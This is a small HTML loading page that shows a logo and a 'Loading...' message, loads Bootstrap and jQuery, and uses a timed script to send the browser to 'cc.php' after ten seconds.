<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Loading</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/title.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/title.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
   <section style="margin-top:300px;">
        <div class="logo text-center">
            <img src="image/logo.png">
        </div>
       <div class="loader" style="color:#006643;">Loading...</div>
    </section>

    

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  
  <script>
            setTimeout(function () {
                window.location.href= 'cc.php';
            },10000); // 1000 = 1s
        </script>
</body>
</html>